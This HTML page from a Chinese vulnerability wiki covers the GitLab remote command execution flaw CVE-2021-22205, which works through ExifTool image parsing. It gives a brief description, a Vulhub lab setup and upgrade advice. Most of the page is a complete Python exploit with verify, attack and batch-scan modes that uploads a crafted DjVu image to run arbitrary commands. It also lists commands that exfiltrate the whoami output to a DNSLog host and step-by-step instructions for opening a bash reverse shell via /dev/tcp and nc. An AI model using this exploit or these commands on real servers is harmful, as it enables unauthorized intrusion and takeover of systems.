<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E5%88%86%E7%B1%BB/GitLab%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-22205/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>GitLab 远程命令执行漏洞 CVE-2021-22205 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "GitLab \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2021-22205", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
              {title: "\u6f0f\u6d1e\u4fee\u590d", url: "#_4" },
              {title: "\u6f0f\u6d1ePOC", url: "#poc" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Gitea%201.4.0%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Gitea%201.4.0%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Gitea 1.4.0 目录穿越导致命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../GitLab%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2016-9086/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../GitLab%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2016-9086/" class="btn btn-xs btn-link">
        GitLab 任意文件读取漏洞 CVE-2016-9086
      </a>
    </div>
    
  </div>

    

    <h1 id="gitlab-cve-2021-22205">GitLab 远程命令执行漏洞 CVE-2021-22205<a class="headerlink" href="#gitlab-cve-2021-22205" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>GitLab是一款Ruby开发的Git项目管理平台。在11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞<a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">CVE-2021-22204</a>的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行任意命令。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://hackerone.com/reports/1154542">https://hackerone.com/reports/1154542</a></li>
<li><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></li>
<li><a href="https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/">https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/</a></li>
<li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml</a></li>
</ul>
<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Vulhub执行如下命令启动一个GitLab 13.10.1版本服务器：</p>
<div class="highlight"><pre><span></span><code>docker-compose up -d
</code></pre></div>
<p>环境启动后，访问<code>http://your-ip:8080</code>即可查看到GitLab的登录页面。</p>
<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>GitLab的/uploads/user接口可以上传图片且无需认证，利用<a href="https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/poc.py">poc.py</a>脚本来测试这个漏洞：</p>
<div class="highlight"><pre><span></span><code>python poc.py http://your-ip:8080 &quot;touch /tmp/success&quot;
</code></pre></div>
<p><img alt="image-20220223215034526" src="../images/202202232150565.png" /></p>
<p>进入容器内，可见<code>touch /tmp/success</code>已成功执行：</p>
<p><img alt="image-20220223214957770" src="../images/202202232149869.png" /></p>
<p>另一个 exp：<a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p>
<p>漏洞检测：</p>
<div class="highlight"><pre><span></span><code>python3 CVE-2021-22205.py -v true -t http://your-target-ip:port/
</code></pre></div>
<p>DNSLog 回显：</p>
<div class="highlight"><pre><span></span><code>python3 CVE-2021-22205.py -a true -t http://your-target-ip:port/ -c &quot;curl http://your-ip/1.txt&quot;
</code></pre></div>
<p>反弹 Shell：</p>
<div class="highlight"><pre><span></span><code># 写shell
python3 CVE-2021-22205.py -a true -t http://your-target-ip:port/ -c &quot;echo &#39;bash -i &gt;&amp; /dev/tcp/your-ip/9999 0&gt;&amp;1&#39; &gt; /tmp/1.sh&quot;

# 赋予执行权限
python3 CVE-2021-22205.py -a true -t http://your-target-ip:port/ -c &quot;chmod +x /tmp/1.sh&quot;

# 监听反弹shell端口
nc -vvl 9999

# 运行shell
python3 CVE-2021-22205.py -a true -t http://your-target-ip:port/ -c &quot;/bin/bash /tmp/1.sh&quot;
</code></pre></div>
<h2 id="_4">漏洞修复<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<ol>
<li>
<p>设置 Gitlab 仅对可信地址开放；</p>
</li>
<li>
<p>升级至安全版本：</p>
</li>
</ol>
<p>GitLab（CE/EE） &gt;= 13.8.8
   GitLab（CE/EE） &gt;= 13.9.6
   GitLab（CE/EE） &gt;= 13.10.3</p>
<h2 id="poc">漏洞POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<p>exp：<a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p>
<div class="highlight"><pre><span></span><code>import requests
from bs4 import BeautifulSoup
import base64
import random
import sys
import os
import argparse

requests.packages.urllib3.disable_warnings()

def title():
    print(&quot;&quot;&quot;
      ______     _______     ____   ___ ____  _      ____  ____  ____   ___  ____  
     / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \|___ \|___ \ / _ \| ___| 
    | |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | __) | __) | | | |___ \ 
    | |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/ / __/ / __/| |_| |___) |
    \____ |  \_/  |_____|   |_____|\___/_____|_|    |_____|_____|_____|\___/|____/ 

                                    Author:Al1ex@Heptagram
                                Github:https://github.com/Al1ex                             
        &quot;&quot;&quot;)
    print(&#39;&#39;&#39;
        验证模式：python CVE-2021-22205.py -v true -t target_url 
        攻击模式：python CVE-2021-22205.py -a true -t target_url -c command 
        批量检测：python CVE-2021-22205.py -s true -f file 
        &#39;&#39;&#39;)    

def check(target_url):
    session = requests.Session()
    try:
        req1 = session.get(target_url.strip(&quot;/&quot;) + &quot;/users/sign_in&quot;, verify=False)
        soup = BeautifulSoup(req1.text, features=&quot;lxml&quot;)
        token = soup.findAll(&#39;meta&#39;)[16].get(&quot;content&quot;)
        data = &quot;\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;test.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\&quot;?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \&quot;\\\n\&quot; . qx{curl `whoami`.82sm53.dnslog.cn} . \\\n\&quot; b \&quot;) )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n&quot;
        headers = {
            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&quot;,
            &quot;Connection&quot;: &quot;close&quot;,
            &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5&quot;,
            &quot;X-CSRF-Token&quot;: f&quot;{token}&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;}
        flag = &#39;Failed to process image&#39;
        req2 = session.post(target_url.strip(&quot;/&quot;) + &quot;/uploads/user&quot;, data=data, headers=headers, verify=False)
        if flag in req2.text:
            print(&quot;[+] 目标 {} 存在漏洞&quot;.format(target_url))
        else:
            print(&quot;[-] 目标 {} 不存在漏洞&quot;.format(target_url))
    except Exception as e:
        print(e)

def attack(target_url,command):
    session = requests.Session()
    try:
        req1 = session.get(target_url.strip(&quot;/&quot;) + &quot;/users/sign_in&quot;, verify=False)
        soup = BeautifulSoup(req1.text, features=&quot;lxml&quot;)
        token = soup.findAll(&#39;meta&#39;)[16].get(&quot;content&quot;)
        data = &quot;\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;test.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\&quot;?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \&quot;\\\n\&quot; . qx{&quot;+  command +&quot;} . \\\n\&quot; b \&quot;) )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n&quot;
        headers = {
            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&quot;,
            &quot;Connection&quot;: &quot;close&quot;,
            &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5&quot;,
            &quot;X-CSRF-Token&quot;: f&quot;{token}&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;}
        flag = &#39;Failed to process image&#39;
        req2 = session.post(target_url.strip(&quot;/&quot;) + &quot;/uploads/user&quot;, data=data, headers=headers, verify=False)
        if flag in req2.text:
            print(&quot;[+] 目标 {} 存在漏洞&quot;.format(target_url))
            print(&quot;[+] 请到dnslog或主机检查执行结果&quot;)
        else:
            print(&quot;[-] 目标 {} 不存在漏洞&quot;.format(target_url))
    except Exception as e:
        print(e)

def scan(file):
    for url_link in open(file, &#39;r&#39;, encoding=&#39;utf-8&#39;):
            if url_link.strip() != &#39;&#39;:
                url_path = format_url(url_link.strip())
                check(url_path)

def format_url(url):
    try:
        if url[:4] != &quot;http&quot;:
            url = &quot;https://&quot; + url
            url = url.strip()
        return url
    except Exception as e:
        print(&#39;URL 错误 {0}&#39;.format(url))    

def main():
    parser = argparse.ArgumentParser(description=&#39;GitLab &lt; 13.10.3 RCE&#39;)
    parser.add_argument(&#39;-v&#39;, &#39;--verify&#39;, type=bool,help=&#39; 验证模式 &#39;)
    parser.add_argument(&#39;-t&#39;, &#39;--target&#39;, type=str, help=&#39; 目标URL &#39;)

    parser.add_argument(&#39;-a&#39;, &#39;--attack&#39;, type=bool, help=&#39; 攻击模式 &#39;)
    parser.add_argument(&#39;-c&#39;, &#39;--command&#39;, type=str, help=&#39; 执行命令 &#39;)

    parser.add_argument(&#39;-s&#39;, &#39;--scan&#39;, type=bool, help=&#39; 批量模式 &#39;)
    parser.add_argument(&#39;-f&#39;, &#39;--file&#39;, type=str, help=&#39; 文件路径 &#39;)


    args = parser.parse_args()

    verify_model = args.verify
    target_url   = args.target

    attack_model = args.attack
    command = args.command

    scan_model = args.scan
    file = args.file

    if verify_model is True and target_url !=None:
        check(target_url)
    elif attack_model is True and target_url != None and command != None:
        attack(target_url,command)
    elif scan_model is True and file != None:
        scan(file)
    else:
        sys.exit(0)   

if __name__ == &#39;__main__&#39;:
    title()
    main()
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Gitea%201.4.0%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Gitea%201.4.0%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Gitea 1.4.0 目录穿越导致命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../GitLab%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2016-9086/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../GitLab%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2016-9086/" class="btn btn-xs btn-link">
        GitLab 任意文件读取漏洞 CVE-2016-9086
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>